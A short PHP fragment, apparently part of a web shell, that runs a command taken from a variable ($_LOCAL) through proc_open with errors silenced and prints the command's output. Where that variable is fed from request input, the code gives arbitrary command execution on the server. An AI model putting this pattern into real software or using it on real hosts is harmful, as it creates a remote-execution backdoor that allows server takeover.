$exec = $_LOCAL;
$proc=@proc_open($exec,
  array(
    array("pipe","r"),
    array("pipe","w"),
    array("pipe","w")
  ),
  $pipes);
  echo @stream_get_contents($pipes[1]);